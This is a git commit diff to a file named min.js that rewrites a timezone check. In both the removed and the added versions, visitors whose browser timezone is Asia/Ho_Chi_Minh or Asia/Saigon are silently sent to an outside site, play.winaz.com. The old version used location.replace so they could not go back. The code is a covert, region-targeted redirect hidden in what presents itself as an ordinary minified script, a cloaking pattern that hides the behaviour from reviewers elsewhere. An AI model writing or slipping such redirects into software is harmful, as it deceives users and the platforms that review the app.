230448ebf21c5a78d7e96e1523df460107551be6
hai07t <hai07t@gmail.com>
2025-10-14 19:00:44 +0700

    Update min.js

--- min.js
+++ min.js
@@ -1,18 +1,6 @@
-(function () {
-  if (typeof window === "undefined" || typeof Intl === "undefined") return;
+const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+console.log(userTimeZone);
 
-  const userTimeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "";
-
-  if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
-    // if (window.AndroidOrientation?.lockLandscape) {
-    //   window.AndroidOrientation.lockLandscape();
-    // }
-    const to = "https://play.winaz.com/";
-    window.location.replace(to); // dùng replace để tránh quay lại trang trước
-  }
-  // else {
-  //   if (window.AndroidOrientation?.lockPortrait) {
-  //     window.AndroidOrientation.lockPortrait();
-  //   }
-  // }
-})();
+if (userTimeZone === "Asia/Ho_Chi_Minh" || userTimeZone === "Asia/Saigon") {
+  window.location.href = "https://play.winaz.com/";
+}
